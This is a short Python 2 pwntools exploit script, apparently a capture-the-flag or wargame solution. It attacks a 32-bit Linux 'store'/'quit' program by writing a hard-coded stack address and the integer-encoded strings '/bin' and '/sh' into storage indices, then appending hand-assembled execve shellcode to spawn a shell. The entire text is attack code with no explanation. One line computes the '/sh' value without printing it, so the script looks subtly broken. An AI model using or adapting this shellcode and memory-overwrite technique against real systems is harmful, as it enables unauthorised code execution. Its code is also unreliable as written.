#!/usr/bin/python2.7
from pwn import *
import binascii
import struct
context(arch ='i386', os ='linux')

def string_to_int(string):
    return str(int(string[::-1].encode('hex'), 16))

def build_shellcode():

	sh = [
	    "pop esi",  
	    "pop ecx",  
	    "pop ecx", 
	    "pop eax",  
	    "push esi",
	    "push ecx",
	    "mov  ebx, esp",
	    "mov ecx, edi",
	    "mov edx, edi",
	    "int  0x80"
	]

	shellcode = ''

	for instr in sh:
	    shellcode += asm(instr)

	return shellcode

print "store"
print str(int(0xBFFFF58C))
print "109"

print "store"
string_to_int('/sh')
print "110"

print "store"
print string_to_int("/bin")
print "112"

print "store"
print "11"
print "113"

print "quit" + build_shellcode()
